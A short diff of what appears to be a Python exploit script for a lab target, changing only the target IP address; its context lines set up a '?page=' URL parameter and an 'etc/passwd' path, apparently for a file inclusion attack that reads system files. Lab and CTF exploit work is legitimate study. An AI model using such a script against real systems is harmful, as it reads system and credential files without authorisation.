@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 
-host = "192.168.55.3"
+host = "192.168.56.110"
 url = f"http://{host}/?page="
 passwd = "etc/passwd"
 
